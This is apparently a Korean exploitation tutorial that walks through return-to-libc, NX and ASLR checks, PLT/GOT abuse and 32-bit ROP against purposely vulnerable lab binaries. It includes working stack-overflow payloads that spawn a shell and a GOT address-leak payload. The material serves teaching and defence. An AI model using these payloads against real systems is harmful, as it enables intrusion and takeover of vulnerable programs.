HelloWorld.c는 Hello World!를 출력하는 간단한 예제를 통해 이를 알아보도록 하겠습니다.

HelloWorld 프로그램의 0xf7e03000 ~ 0xf7fb3000 영역이 libc.so.6 라이브러리 코드영역 주소이고, gdb 화면을 보면 프로그램에서 사용된 printf 함수 이외의 다른 함수들이 메모리에 존재한다는 것을 확인할 수 있습니다.

프로그램에 스택 버퍼 오버플로우 취약점이 존재할 때, 리턴 주소를 이와 같은 방법으로 알아낸 라이브러리 함수의 주소로 바꾸면 해당하는 함수를 호출할 수 있습니다.


```
// HelloWorld.c
// gcc -o HelloWorld HelloWorld.c -m32
#include <stdio.h>
int main(void){
  printf("Hello World!\n");
}
```


```
$ gdb -q ./HelloWorld
Reading symbols from ./HelloWorld...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804840e
(gdb) r
Starting program: ~/HelloWorld 
```


## RTL

Return To Libc(RTL)은 리턴 주소를 라이브러리 내에 존재하는 함수의 주소로 바꿔 NX bit를 우회하는 공격 기법입니다.

리눅스 익스플로잇의 최종 목표는 셸 바이너리를 실행하는 것입니다. libc.so.6 라이브러리에는 execve , execlp , execl , execvp , system , popen 등 프로그램을 실행할 수 있는 다양한 함수들이 존재합니다. 이 중 system 함수는 인자를 하나만 받기 때문에 익스플로잇할 때 많이 사용됩니다. system 함수의 인자는 실행할 셸 명령어 문자열의 주소이기 때문에, 만약 "/bin/sh" 문자열의 주소를 system 함수의 인자로 넘겨준 후 호출하면 /bin/sh 바이너리가 실행됩니다.

example1 예제에 NX bit가 추가된 example1_nx를 이용해 RTL을 실습해 보도록 하겠습니다.

취약점은 이전과 동일하지만 example1_nx에는 NX bit가 적용되어 스택의 셸코드를 실행시킬 수 없습니다.

이전 익스플로잇에서는 스택 내의 셸코드를 실행시켜 execve 시스템 콜을 호출하는 것이 목표였다면, RTL의 목표는 라이브러리 내에 존재하는 system 함수를 호출하여 system("/bin/sh")를 실행하는 것입니다.


```
//gcc -o example1_nx example1.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int vuln(char * src){
  
  char buf[32] = {};
  
  strcpy(buf, src);
  return 0;
}
int main(int argc, char * argv[], char * environ[]){
  if (argc < 2){
    exit(-1);
  }
  vuln(argv[1]);
  return 0;
}
```


### RTL
buf 배열부터 vuln 함수의 리턴 주소 위치까지는 이전과 동일하게 36바이트 입니다. 실행 결과 eip 레지스터가 0x42424242로 바뀌었고, ret을 하기 전의 스택 포인터인 esp-4 메모리에 0x42424242가 저장되어있는 것을 볼 수 있습니다.

만약 인자가 3개인 함수 func(1, 2, 3)을 호출한다면, func+0 시점에서의 스택 메모리 상태는 다음과 같습니다.

![](https://i.imgur.com/hnIo8K3.png)


RTL에서, 리턴 주소에 호출할 함수의 주소를 덮어쓴 후 ret을 하면 eip 레지스터가 덮은 값이 되고, esp 레지스터는 리턴 주소의 위치+4가 됩니다.

위 스택 구조를 참고해 보았을 때, 함수 시작 부분에서의 인자의 위치는 esp+4가 되고, 호출된 함수의 리턴 주소가 저장된 위치는 esp+0이 됩니다.

앞서 배운 함수 호출 규약을 참고하여 보면, system("/bin/sh")를 호출하는 익스플로잇 코드는 오른쪽의 익스플로잇 코드 구조와 같이 구성됩니다.

BBBB 문자열은 system 함수가 종료되고 난 후 리턴할 주소인데, 단지 system("/bin/sh")를 실행하는 것이 목표이기 때문에 임의의 값을 적어도 무방합니다.



```
(gdb) r `python -c 'print "A"*36+"BBBB"'`
Starting program: ~/example1_nx `python -c 'print "A"*36+"BBBB"'`
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0xffffd770	-10384
edx            0xffffd520	-10976
ebx            0x0	0
esp            0xffffd524	0xffffd524
ebp            0x41414141	0x41414141
esi            0xf7fb5000	-134524928
edi            0xf7fb5000	-134524928
eip            0x42424242	0x42424242
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) x/4wx $esp-4
0xffffd520:	0x42424242	0xffffd700	0x00000000	0xf7e1b637
(gdb) 

```

익스플로잇 코드

```
"A" * 36 + (system 함수 주소) + "BBBB" + ("/bin/sh" 주소)
```



### RTL에 필요한 주소 찾기


system("/bin/sh")를 호출하기 위해 알아야 하는 값은 system 함수의 주소와 /bin/sh 문자열의 주소입니다.

gdb를 이용해 이들의 값을 알아보도록 하겠습니다.

main 함수에 브레이크포인트를 설정한 후, gdb의 print 명령어를 통해 system 주소를 찾고, find 명령어를 통해 libc.so.6 라이브러리에 존재하는 /bin/sh 문자열의 주소를 찾았습니다.

system이나 popen 등의 셸 명령어 실행 함수들이 내부적으로 /bin/sh 문자열을 사용하기 때문에 라이브러리 메모리에서 /bin/sh 문자열을 찾을 수 있습니다. 다음은 system 함수의 소스코드입니다.

```
#define        SHELL_PATH        "/bin/sh"        /* Path of the shell.  */
#define        SHELL_NAME        "sh"                /* Name to give it.  */
...
static int
do_system (const char *line)
{
...
  status = __posix_spawn (&pid, SHELL_PATH, 0, &spawn_attr,
                          (char *const[]){ (char*) SHELL_NAME,
                                           (char*) "-c",
                                           (char *) line, NULL },
                          __environ);
  __posix_spawnattr_destroy (&spawn_attr);
...
}
int
__libc_system (const char *line)
{
  if (line == NULL)
    /* Check that we have a command processor available.  It might
       not be available after a chroot(), for example.  */
    return do_system ("exit 0") == 0;
  return do_system (line);
}
weak_alias (__libc_system, system)
```

```
$ gdb -q ./example1_nx
Reading symbols from ./example1_nx...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048479
(gdb) r aaaabbbb
Starting program: ~/example1_nx aaaabbbb
Breakpoint 1, 0x080484fb in main ()
(gdb) info proc map
process 110780
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 ~/example1_nx
	 0x8049000  0x804a000     0x1000        0x0 ~/example1_nx
	 0x804a000  0x804b000     0x1000     0x1000 ~/example1_nx
	0xf7e02000 0xf7e03000     0x1000        0x0 
	0xf7e03000 0xf7fb3000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb3000 0xf7fb5000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb5000 0xf7fb6000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb6000 0xf7fb9000     0x3000        0x0 
	0xf7fd3000 0xf7fd4000     0x1000        0x0 
	0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
	0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
	0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e3dda0 <system>
(gdb) find 0xf7e03000, 0xf7fb3000, "/bin/sh"
0xf7f5ea0b
1 pattern found.
(gdb) x/s 0xf7f5ea0b
0xf7f5ea0b:	"/bin/sh"
(gdb) 
```

![](https://i.imgur.com/vnDyvau.png)

![](https://i.imgur.com/KpHyOiu.png)


이제 앞에서 알아낸 system 함수와 "/bin/sh" 문자열의 주소를 이용해 실제 익스플로잇을 만들어 보면 오른쪽의 익스플로잇 코드가 완성됩니다.

vuln 함수가 리턴하는 시점에 브레이크포인트를 설정해 스택 메모리를 살펴보겠습니다.

```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x20
   ...
   0x08048475 <+58>:	ret    
End of assembler dump.
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475
(gdb) r `python -c 'print "A"*36+"\xa0\xdd\xe3\xf7"+"BBBB"+"\x0b\xea\xf5\xf7"'`
Starting program: ~/example1_nx `python -c 'print "A"*36+"\xa0\xdd\xe3\xf7"+"BBBB"+"\x0b\xea\xf5\xf7"'`
Breakpoint 1, 0x08048475 in vuln ()
(gdb) x/i $eip
=> 0x8048475 <vuln+58>:	ret    
(gdb) x/3wx $esp
0xffffd5b0:	0xf7e3dda0	0x42424242	0xf7f5ea0b
```

system 함수의 주소와 "/bin/sh" 문자열의 주소가 스택에 저장되어 있는 것을 확인할 수 있습니다.

마지막으로 이를 실제 바이너리의 argv[1]에 넣어 실행해보면 정상적으로 셸이 실행되는 것을 확인할 수 있습니다.


### 익스플로잇 코드

```
"A"*36 + "\xa0\xdd\xe3\xf7" + "BBBB" + "\x0b\xea\xf5\xf7"
```


### 익스플로잇 코드 실행

```
$ ./example1_nx `python -c 'print "A"*36 + "\xa0\xdd\xe3\xf7" + "BBBB" + "\x0b\xea\xf5\xf7"'`
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$
```

## NX bit가 설정되어 있는지 확인하는 방법

바이너리의 NX bit적용 여부를 알아내는 것은 스택 메모리의 권한을 검사하는 것으로도 충분합니다.

ELF 바이너리 분석 도구인 readelf를 사용하면 NX bit 적용 여부를 쉽게 확인할 수 있습니다.

오른쪽의 readelf 사용 예시와 같이 readelf -a 'path'의 출력 결과에서 grep을 통해 "STACK" 문자열을 검색하여 스택 메모리의 권한을 볼 수 있습니다.

NX bit가 적용되어 있지 않은 example1 바이너리는 RWE(읽기, 쓰기, 실행) 권한으로, NX bit가 설정되어 있는 example1_nx 바이너리는 RW(읽기, 쓰기) 권한으로 설정되어 있는 것을 확인할 수 있습니다.

readelf를 사용하지 않고 실행되고 있는 바이너리의 메모리 맵에 있는 권한을 확인하는 것으로도 NX bit 적용 여부를 확인할 수 있습니다.

NX bit가 적용되어 있지 않은 example1의 스택 영역 권한을 보면 rwx인 것을 볼 수 있습니다.


* readelf를 이용한 체크
```
$ readelf -a ./example1 | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
$ readelf -a ./example1_nx | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

* 메모리맵을 이용한 체크

```
$ gdb -q ./example1
Reading symbols from ./example1...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048479
(gdb) r
Starting program: ~/example1 
Breakpoint 1, 0x08048479 in main ()
(gdb) shell cat /proc/`pidof example1`/maps | grep -i stack
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
(gdb) 
```


# Linux Exploitation & Mitigation Part2

# 1. ASLR

Address Space Layout Randomization(ASLR)은 라이브러리, 힙, 스택 영역 등의 주소를 바이너리가 실행될 때마다 랜덤하게 바꿔 RTL과 같이 정해진 주소를 이용한 공격을 막기 위한 보호 기법입니다.

NX bit는 바이너리의 컴파일 옵션에 따라 적용 여부가 결정되었던 것과 달리, ASLR은 서버의 설정 파일에 의해 보호 기법의 적용이 결정됩니다.

Ubuntu 16.04에서는 /proc/sys/kernel/randomize_va_space 파일의 값을 확인하면 서버의 ASLR 설정 여부를 알 수 있습니다. 설정 파일의 값으로는 0, 1, 2가 있습니다. 각 값은 아래와 같은 의미를 갖습니다.

0 : ASLR을 적용하지 않음

1 : 스택, 힙 메모리를 랜덤화

2 : 스택, 힙, 라이브러리 메모리를 랜덤화




만약 해당 파일의 값이 2가 아니라면, 루트 권한으로 다음 명령어를 실행하여 ASLR 보호 기법을 적용할 수 있습니다.


```
# cat /proc/sys/kernel/randomize_va_space 
0
# echo 2 > /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
2
# 
```

```
//example3.c
//gcc -o example3 example3.c -m32
#include <stdio.h>
#include <stdlib.h>
int main(void){
  char * buf = (char *)calloc(1, 4096);
  FILE * fp = 0;
  size_t sz = 0;
  fp = fopen("/proc/self/maps", "r");
  sz = fread(buf, 1, 4096, fp);
  fwrite(buf, 1, sz, stdout);
}
```
example3.c는 프로세스 자신의 메모리 맵을 읽어 출력해주는 코드입니다. 서버에 ASLR이 켜져있을 때, 라이브러리, 힙, 스택 영역의 주소가 랜덤하게 바뀌는 것을 확인할 수 있습니다.

라이브러리 주소가 계속 바뀌기 때문에, 스택 버퍼 오버플로우 취약점을 공격할 때 정적 주소를 이용한 공격을 사용할 수 없습니다. 하지만 example3의 실행 결과를 보면 알 수 있듯이, 바이너리 코드 영역의 주소는 변하지 않습니다. 이를 이용해 ASLR 보호 기법을 우회하여 익스플로잇할 수 있습니다.

```
//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}

```

example4.c는 scanf 함수로 32바이트 크기의 배열 buf에 데이터를 입력받습니다. 이때, "%s" 포맷 스트링을 사용하기 때문에 입력 길이의 제한이 없어 스택 버퍼 오버플로우 취약점이 발생합니다. 최종 목표는 이전과 마찬가지로 /bin/sh 바이너리를 실행하는 것입니다.

우선 바이너리에 NX bit가 적용되어 있는지 확인하겠습니다.

```
$ readelf -a ./example4 | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

readelf로 확인한 스택 메모리의 권한은 RW로, 바이너리에 NX bit가 적용되어 있습니다. 또한 서버에 ASLR 보호 기법이 적용되어 있기 때문에 이전의 공격 기법은 사용할 수 없습니다.

```
$ gdb -q ./example4 
Reading symbols from ./example4...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804845b <+0>:	push   ebp
   0x0804845c <+1>:	mov    ebp,esp
   0x0804845e <+3>:	sub    esp,0x20
   0x08048461 <+6>:	mov    ecx,0x0
   0x08048466 <+11>:	mov    eax,0x20
   0x0804846b <+16>:	and    eax,0xfffffffc
   0x0804846e <+19>:	mov    edx,eax
   0x08048470 <+21>:	mov    eax,0x0
   0x08048475 <+26>:	mov    DWORD PTR [ebp+eax*1-0x20],ecx
   0x08048479 <+30>:	add    eax,0x4
   0x0804847c <+33>:	cmp    eax,edx
   0x0804847e <+35>:	jb     0x8048475 <main+26>
   0x08048480 <+37>:	push   0x8048540
   0x08048485 <+42>:	call   0x8048320 <puts@plt>
   0x0804848a <+47>:	add    esp,0x4
   0x0804848d <+50>:	push   0x804854d
   0x08048492 <+55>:	call   0x8048320 <puts@plt>
   0x08048497 <+60>:	add    esp,0x4
   0x0804849a <+63>:	lea    eax,[ebp-0x20]
   0x0804849d <+66>:	push   eax
   0x0804849e <+67>:	push   0x8048559
   0x080484a3 <+72>:	call   0x8048340 <__isoc99_scanf@plt>
   0x080484a8 <+77>:	add    esp,0x8
   0x080484ab <+80>:	mov    eax,0x0
   0x080484b0 <+85>:	leave  
   0x080484b1 <+86>:	ret    
End of assembler dump.
(gdb) r
Starting program: ~/Linux_Exploitation_Mitigation/example4 
Hello World!
Hello ASLR!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) p/x $eip
$1 = 0x42424242
(gdb) 

```

먼저 스택 오버플로우 취약점을 이용해 스택의 리턴 주소를 덮어 보겠습니다.

main 함수의 디스어셈블리 결과를 보면, scanf 함수의 2번째 인자인 buf 배열의 주소는 ebp-0x20인 것을 알 수 있습니다.

ebp 레지스터가 가리키는 위치에는 스택 프레임 포인터가 존재하고 ebp+4에 main 함수의 리턴 주소가 위치합니다. 따라서 `"A"'*36 + "BBBB"`를 입력으로 넣었을 때 main 함수가 리턴한 이후 eip 레지스터의 값이 0x42424242로 바뀐 것을 확인할 수 있습니다.
![](https://i.imgur.com/m497D3W.png)

NX bit가 걸려 있으므로, 프로그램이 비정상 종료하지 않기 위해서는 실행 권한이 있는 코드 영역으로 덮어야 합니다.

앞서 example3 를 순차적으로 실행시킨 결과를 볼 때, 라이브러리, 힙, 스택 메모리의 주소는 랜덤으로 변하지만 바이너리의 코드나 데이터 영역들의 주소는 변하지 않는 것을 알 수 있습니다.



# 2. PLT, GOT Section

example4의 디스어셈블리 결과를 보면 puts와 scanf 함수를 호출할 때 해당 함수의 라이브러리 코드 주소로 바로 점프하지 않고 PLT 영역으로 점프하는 것을 확인할 수 있습니다.

Procedure Linkage Table(PLT)는 외부 라이브러리 함수를 사용할 수 있도록 주소를 연결해주는 역할을 하는 테이블입니다. Global Offset Table(GOT)는 PLT에서 호출하는 resolve 함수를 통해 구한 라이브러리 함수의 절대 주소가 저장되어 있는 테이블입니다.

ASLR이 적용되어 있는 환경에서, 동적으로 라이브러리를 링크하여 실행되는 바이너리(Dynamically linked binary)는 바이너리가 실행될 때마다 라이브러리가 매핑되는 메모리의 주소가 변합니다. PLT와 GOT 영역이 존재하는 이유는 Dynamically linked binary의 경우 바이너리가 실행되기 전까지 라이브러리 함수의 주소를 알 수 없기 때문입니다. 라이브러리가 메모리에 매핑된 후 라이브러리 함수가 호출되면, 정적 주소를 통해 해당 함수의 PLT와 GOT 영역에 접근함으로써 함수의 주소를 찾습니다.

* puts 함수의 PLT *

```
   0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048326 <puts@plt+6>:	push   0x0
   0x804832b <puts@plt+11>:	jmp    0x8048310
```

* puts 함수의 GOT *

```
(gdb) x/wx 0x804a00c
0x804a00c:	0x08048326
(gdb) 
```

* example4.c *
```
//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -no-pie
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}
```

* Disassembly of example4's main func *


```
…
   0x08048480 <+37>:	push   0x8048540
   0x08048485 <+42>:	call   0x8048320 <puts@plt>
   0x0804848a <+47>:	add    esp,0x4
   0x0804848d <+50>:	push   0x804854d
   0x08048492 <+55>:	call   0x8048320 <puts@plt>
   0x08048497 <+60>:	add    esp,0x4
   0x0804849a <+63>:	lea    eax,[ebp-0x20]
   0x0804849d <+66>:	push   eax
   0x0804849e <+67>:	push   0x8048559
   0x080484a3 <+72>:	call   0x8048340 <__isoc99_scanf@plt>
…
```

디버깅을 통해 puts 함수를 호출했을 때 PLT에서 어떤 일을 하는지 확인해 보도록 하겠습니다.

```
(gdb) b*0x8048485
Breakpoint 1 at 0x8048485
(gdb) r
Starting program: ~/example4 
Breakpoint 1, 0x08048485 in main ()
(gdb) x/i $eip
=> 0x8048485 <main+42>:	call   0x8048320 <puts@plt>
(gdb) si
0x08048320 in puts@plt ()
(gdb) x/4i $eip
=> 0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048326 <puts@plt+6>:	push   0x0
   0x804832b <puts@plt+11>:	jmp    0x8048310
   0x8048330 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a010
(gdb) x/wx 0x804a00c
0x804a00c:	0x08048326
(gdb) x/2i 0x8048310
   0x8048310:	push   DWORD PTR ds:0x804a004
   0x8048316:	jmp    DWORD PTR ds:0x804a008
(gdb) x/wx 0x804a008
0x804a008:	0xf7fee000
```
puts@plt+0에서는 0x804a00c 메모리를 참조하여 저장되어있는 값으로 점프합니다. 해당 메모리에는 puts@plt+6의 주소가 저장되어 있습니다. puts@plt+6에서는 스택에 0을 push한 후 0x8048310 함수로 점프합니다.

이후에는 0x804a008 주소에 저장되어 있는 0xf7fee000 함수로 점프합니다.

링커 라이브러리인 ld-linux.so.2 메모리에 있는 0xf7fee000 함수가 리턴하는 시점에 브레이크포인트를 설정해 스택 메모리를 확인해 보았습니다. puts 함수로 점프하는 것으로 보아, 0xf7fee000 함수는 호출된 라이브러리 함수의 주소를 알아내는 함수라는 것을 알 수 있습니다.

```
(gdb) x/11i 0xf7fee000
   0xf7fee000:	push   eax
   0xf7fee001:	push   ecx
   0xf7fee002:	push   edx
   0xf7fee003:	mov    edx,DWORD PTR [esp+0x10]
   0xf7fee007:	mov    eax,DWORD PTR [esp+0xc]
   0xf7fee00b:	call   0xf7fe77e0
   0xf7fee010:	pop    edx
   0xf7fee011:	mov    ecx,DWORD PTR [esp]
   0xf7fee014:	mov    DWORD PTR [esp],eax
   0xf7fee017:	mov    eax,DWORD PTR [esp+0x4]
   0xf7fee01b:	ret    0xc
(gdb) b*0xf7fee01b
Breakpoint 2 at 0xf7fee01b
(gdb) c
Continuing.
Breakpoint 2, 0xf7fee01b in ?? () from /lib/ld-linux.so.2
(gdb) x/wx $esp
0xffffd520:	0xf7e62ca0
(gdb) x/i 0xf7e62ca0
   0xf7e62ca0 <puts>:	push   %ebp
(gdb) 
```



* Abusing PLT,GOT *


특정 함수의 PLT를 호출하면 함수의 실제 주소를 호출하는 것과 같은 효과를 나타냅니다. PLT의 주소는 고정되어 있기 때문에 서버에 ASLR 보호 기법이 적용되어 있어도 PLT로 점프하면 RTL과 비슷한 공격이 가능합니다.

example4 예시에서 스택 버퍼 오버플로우 취약점을 이용해 리턴 주소를 puts@plt+6(0x8048326)으로 바꾸고, 첫 번째 인자는 "ASLR!" 문자열의 주소인 0x8048553로 바꿔 보겠습니다.

puts 함수가 실행되어 "ASLR!" 문자열이 출력된 것을 볼 수 있습니다. 하지만 puts 함수가 실행된 후 리턴할 주소는 0x42424242이기 때문에 Segmentation fault가 발생하여 프로그램이 비정상 종료됩니다.


```
$ (python -c 'print "A"*36 + "\x26\x83\x04\x08" + "BBBB" + "\x53\x85\x04\x08"') | ./example4
Hello World!
Hello ASLR!
ASLR!
[1]    121124 done                              ( python -c 'print "A"*36 + "\x26\x83\x04\x08" + "BBBB" + "\x53\x85\x04\x08"') | 
       121126 segmentation fault (core dumped)  ./example4


```


함수가 호출될 때 GOT에 저장된 주소로 점프하기 때문에 GOT에 저장된 값을 바꾸면 원하는 주소로 점프할 수 있습니다.

example4 바이너리의 main 함수에 브레이크포인트를 걸고 실행한 후 puts 함수의 GOT인 0x804a00c 메모리의 값을 0xdeadbeef로 바꾸어 보겠습니다.

```
$ gdb -q ./example4
Reading symbols from ./example4...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048461
(gdb) r
Starting program: ~/example4 
Breakpoint 1, 0x08048461 in main ()
(gdb) set *0x804a00c = 0xdeadbeef
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
(gdb) x/i $eip
=> 0xdeadbeef:	Cannot access memory at address 0xdeadbeef
(gdb) 
```

프로그램을 이어서 실행하면 puts가 호출될 때 puts@got에 저장된 값으로 점프해 eip 레지스터의 값이 0xdeadbeef로 바뀌게 됩니다.

이제 PLT에 존재하는 함수들, 즉 프로그램에서 한 번 이상 사용하는 라이브러리 함수들은 고정된 주소를 통해 호출할 수 있다는 것을 알게 되었습니다. 하지만 익스플로잇 대상 바이너리인 example4에서는 최종 목표인 셸을 획득하는 데 필요한 함수들(system 함수나 exec 계열 함수)을 사용하지 않기 때문에 ASLR 환경에서 직접적으로 해당 함수들을 호출할 수 없습니다.


# 3. 32bit Return Oriented Programming (

)

PLT에는 프로그램 내에서 호출하는 함수들만 존재합니다. 하지만 익스플로잇 대상 바이너리인 example4에서는 system과 같은 셸을 획득하는 데 필요한 함수를 사용하지 않기 때문에 ASLR 환경에서 직접적으로 이를 호출할 수 없습니다. 32비트 ELF 바이너리는 ASLR로 랜덤화되는 주소의 범위가 크지 않기 때문에 호출하고자 하는 라이브러리 함수의 주소를 무차별 대입을 통해 맞출 수도 있지만 (약 1/4096), 100% 에 가까운 확률로 익스플로잇할 수 있는 공격 기법이 존재합니다.

Return Oriented Programming(ROP)는 코드 영역에 있는 다양한 코드 가젯들을 조합해 NX bit와 ASLR 보호 기법을 우회할 수 있는 공격 기법입니다.

ROP 기술은 스택 오버플로우와 같은 취약점으로 콜 스택을 통제할 수 있기 때문에 주로 스택 기반 연산을 하는 코드 가젯들이 사용됩니다.

바이너리 코드 영역에 example5와 같은 코드 가젯들이 존재하고 있습니다.

스택 오버플로우 취약점을 통해 리턴 주소 및 그 뒤의 메모리를 원하는 값으로 덮어쓸 수 있다고 가정하였을 때, example5 코드 가젯들로 ebp 레지스터의 값을 0xdeadbeef로 바꾸어 보겠습니다.

```
//example4.c
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}

```

```
; example5
0x8048380:
  pop eax
  ret
0x8048480:
  xchg ebp, ecx
  ret
  
0x8048580:
  mov ecx, eax
  ret
```


example5에 있는 코드 가젯들은 모두 ret 명령어로 끝납니다.

이는 하나의 코드 가젯의 실행이 끝난 후 다음 코드 가젯으로 리턴하여 여러 가젯들을 체이닝하여 실행하는 것을 가능하게 해줍니다.

리턴 주소를 시작으로 스택이 다음과 같이 구성되어 있다고 가정해 보겠습니다.

![](https://i.imgur.com/MBhtXuy.png)

현재 esp 레지스터가 가리키고 있는 메모리는 진한 색으로 표시되었습니다.

스택 오버플로우 취약점이 존재하는 함수가 리턴할 때, 리턴 주소가 0x8048380으로 바뀌어 있기 때문에 0x8048380으로 점프합니다.

이 때의 스택과 esp 레지스터의 상태는 다음과 같습니다.

![](https://i.imgur.com/OtTaHf2.png)

0x8048380에서 pop eax 를 실행하면 eax 레지스터에 현재 esp 레지스터가 가리키고 있는 0x41414141이 들어가게 되고, 스택과 esp 레지스터는 다음과 같은 상태가 됩니다.


![](https://i.imgur.com/k92mD7Q.png)

0x8048380에 위치한 코드 가젯인 pop eax 를 실행한 후에 ret을 실행하기 때문에 실행 흐름은 현재 esp 레지스터가 가리키고 있는 0x8048580으로 분기합니다.

0x8048580 코드 가젯은 mov ecx, eax 이기 때문에 ecx에 0x41414141이 들어가게 됩니다.


이렇듯, ret 명령으로 코드 가젯들을 사용하면 여러 가젯을 연결하여 하나의 가젯으로는 할 수 없는 행위를 할 수 있게 됩니다.

이러한 기술은 마치 리턴을 이용해 여러 코드를 묶어 프로그래밍하는 것과 같아 Return Oriented Programming이라 불리게 되었습니다.

그렇다면 ebp 레지스터의 값을 0xdeadbeef로 바꾸기 위해 구성된 스택을 살펴보도록 하겠습니다.

![](https://i.imgur.com/wOlfWYp.png)


이와 같이 스택이 구성되면 아래와 같이 pop eax(0xdeadbeef) + mov ecx, eax + xchg ebp, ecx 명령들이 순차적으로 실행되어 최종적으로는 ebp 레지스터에 0xdeadbeef 값이 들어가게 됩니다.



* Exploit using ROP *

```
//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}
```

이제 ROP를 이용해 example4 를 공격해 보겠습니다.

익스플로잇의 최종 목표는 system("/bin/sh")를 실행하는 것입니다.

첫 번째 단계는 system 함수의 주소와 "/bin/sh" 문자열의 주소를 찾는 것입니다. 프로그램은 실행될 때마다 라이브러리 주소가 랜덤하게 매핑됩니다. 그러나 한 번 매핑된 라이브러리 주소는 프로그램이 종료될 때까지 바뀌지 않습니다. 이를 이용하여 system 함수와 "/bin/sh" 문자열의 주소를 찾을 수 있습니다.

Leaking libc.so.6 Address

```
$ gdb -q ./example4
Reading symbols from ./example4...(no debugging symbols found)...done.
(gdb) x/3i 0x8048320
   0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048326 <puts@plt+6>:	push   0x0
   0x804832b <puts@plt+11>:	jmp    0x8048310
(gdb) x/3i 0x8048340
   0x8048340 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804a014
   0x8048346 <__isoc99_scanf@plt+6>:	push   0x10
   0x804834b <__isoc99_scanf@plt+11>:	jmp    0x8048310
(gdb) 
```

메모리에 로딩된 libc.so.6 라이브러리의 주소를 구하는 방법에 대해 알아보도록 하겠습니다. 앞서 라이브러리 함수를 사용하고 나면, GOT에 해당 함수의 주소가 저장된다는 것을 배웠습니다. 바이너리에 존재하는 puts 함수의 PLT를 이용해 scanf의 GOT에 있는 scanf 함수의 실제 주소를 출력해보도록 하겠습니다.

먼저 gdb를 이용해 puts의 PLT 주소를 구합니다. main 함수에서 puts@plt의 주소인 0x8048320을 구했습니다. 또한 scanf의 PLT에서 참조하는 주소 0x804a014가 scanf의 GOT 주소인 것을 알 수 있습니다. 공격 코드를 만들기 전에, scanf에서 "%s" 포맷 스트링을 이용해 입력을 받기 때문에 주의해야 할 것이 있습니다.

"%s" 포맷 스트링은 공백이나 개행 등 단어를 구분하는 문자를 입력하면 더이상 입력을 받지 않습니다.

puts 함수의 PLT 주소는 공백 문자로 시작하기 때문에, 해당 문자를 입력한 이후에 공격 코드를 삽입할 수 없습니다.

PLT를 호출하는 과정을 생각해 보면, puts@plt가 아닌 puts@plt+6으로 점프해도 puts@plt를 호출한 것과 같은 결과가 됩니다.

때문에 공격 코드에서는 입력의 종료를 방지하기 위해 0x8048320이 아닌 0x8048326를 사용합니다.


scanf의 GOT 주소에 저장된 값을 출력해 보도록 하겠습니다.

```
$ (python -c 'print "A"*36+"\x26\x83\x04\x08"+"AAAA"+"\x14\xa0\x04\x08"';cat) | ./example4
Hello World!
Hello ASLR!
????
[1]    124132 broken pipe                       ( python -c 'print "A"*36+"\x26\x83\x04\x08"+"AAAA"+"\x14\xa0\x04\x08"'; cat;  | 
       124134 segmentation fault (core dumped)  ./example4
```

출력 결과를 보면, ????와 같은 non-printable character가 출력된 것을 확인할 수 있습니다. 이는 scanf 함수 주소에 아스키 범위를 넘어선 문자가 존재하기 때문입니다.

